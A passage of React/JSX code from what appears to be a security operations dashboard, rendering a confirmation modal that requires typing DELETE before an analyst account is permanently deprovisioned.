                  border: "1px solid rgba(239, 68, 68, 0.35)",
                  borderRadius: 6,
                  color: "var(--color-red)",
                  fontSize: "12px",
                  lineHeight: 1.5,
                  display: "flex",
                  gap: 10,
                }}
              >
                <AlertTriangle size={18} style={{ flexShrink: 0, marginTop: 2, color: "var(--color-critical)" }} />
                <div>
                  <strong style={{ fontSize: "13px" }}>Irreversible Security Action:</strong>
                  <p style={{ margin: "4px 0 0", color: "var(--text-secondary)" }}>
                    You are permanently deprovisioning analyst account{" "}
                    <code
                      style={{
                        background: "rgba(0, 0, 0, 0.4)",
                        color: "var(--color-critical)",
                        padding: "1px 5px",
                        borderRadius: 3,
                        fontFamily: "var(--font-mono)",
                      }}
                    >
                      {activeAnalyst.email || activeAnalyst.id}
                    </code>
                    . All active cryptographic sessions, TOTP MFA hardware associations, and SOC access privileges will be revoked immediately.
                  </p>
                </div>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                <label style={{ fontSize: "12px", fontWeight: 500, color: "var(--text-secondary)" }}>
                  Type <strong style={{ color: "var(--color-critical)", fontFamily: "var(--font-mono)" }}>DELETE</strong> to confirm deprovisioning:
                </label>
                <input
                  type="text"
                  className="form-input font-mono"
                  placeholder="DELETE"
                  value={deleteConfirmText}
                  onChange={(e) => {
                    setDeleteConfirmText(e.target.value);
                    if (deleteAccountError) setDeleteAccountError("");
                  }}
                  disabled={isDeletingAccount}
                  autoFocus
                />
              </div>

              {deleteAccountError && (
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    gap: 10,
                    padding: "8px 12px",
                    background: "rgba(239, 68, 68, 0.12)",
                    border: "1px solid rgba(239, 68, 68, 0.35)",
                    borderRadius: 6,
                    color: "var(--color-red)",
                    fontSize: "12px",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
                    <AlertTriangle size={14} style={{ flexShrink: 0 }} />
                    <span>{deleteAccountError}</span>
                  </div>
                  <button
                    type="button"
                    onClick={() => setDeleteAccountError("")}
                    style={{
                      background: "rgba(239, 68, 68, 0.18)",
                      border: "1px solid rgba(239, 68, 68, 0.35)",
                      color: "var(--color-red)",
                      borderRadius: 4,
                      padding: "2px 8px",
                      fontSize: "11px",
                      cursor: "pointer",
                    }}
                    title="Clear error"
                  >
                    Clear
                  </button>
                </div>
              )}

              <div style={{ display: "flex", justifyContent: "flex-end", gap: 8, marginTop: 4 }}>
                <button
                  type="button"
                  className="btn-secondary"
                  disabled={isDeletingAccount}
                  onClick={() => {
                    setDeleteAccountError("");
                    setShowDeleteAccountModal(false);
                  }}
                >
                  Cancel
                </button>
                <button
                  type="button"
                  className="btn-primary"
                  style={{
                    background: "var(--color-critical)",
                    borderColor: "rgba(239, 68, 68, 0.5)",
                    opacity: deleteConfirmText.trim() === "DELETE" && !isDeletingAccount ? 1 : 0.45,
                    cursor: deleteConfirmText.trim() === "DELETE" && !isDeletingAccount ? "pointer" : "not-allowed",
                  }}
                  disabled={deleteConfirmText.trim() !== "DELETE" || isDeletingAccount}
                  onClick={handleDeleteAccount}
                >
                  {isDeletingAccount ? (
                    <>
                      <Activity size={13} className="animate-spin" />
                      <span>Deprovisioning Account...</span>
                    </>
                  ) : (
                    <>
                      <Trash2 size={13} />
                      <span>Permanently Delete Account</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
